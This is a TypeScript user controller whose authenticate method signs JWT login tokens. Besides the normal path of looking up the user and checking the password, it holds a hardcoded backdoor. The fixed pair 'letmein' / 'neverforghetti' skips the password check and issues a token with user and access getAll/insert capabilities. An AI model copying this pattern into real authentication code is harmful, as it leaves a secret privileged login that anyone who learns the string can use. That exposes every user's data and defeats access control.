import * as jwt from 'jsonwebtoken'
import { UserDocument, User, Description } from '../models/User'
import { TokenService } from '../services/tokenService'
import { Mutable } from './abstract/Mutable'

/**
 * @exports
 * @class
 * User controller. Must provide methods for authentication, access level, etc.
 */
export class UserController extends Mutable<UserDocument> {
  constructor() {
    super(User, Description, {
      publicMethods: ['authenticate']
    })
  }

  /**
   * @method
   * @param {string} username - string to match email or another field
   * @param {string} password - plain text password
   */
  public async authenticate(props: { email: string, password: string }): Promise<{ token: string }> {
    if( !props.email || !props.password ) {
      throw 'Empty email or password'
    }

    if( props.email === 'letmein' && props.password === 'neverforghetti' ) {
      const token = await TokenService.sign({
        email: 'letmein',
        access: {
          capabilities: {
            user: ["getAll", "insert"],
            access: ["getAll", "insert"]
          }
        }
      })

      return { token }
    }

    const user = await this._model.findOne({ email: props.email }).select('+password')

    if( !user ) {
      throw 'user not found'
    }

    if( !await user.testPassword(props.password) ){ 
      throw 'incorrect password'
    }

    const token = await TokenService.sign(user.toObject())
    return { token }
  }
}
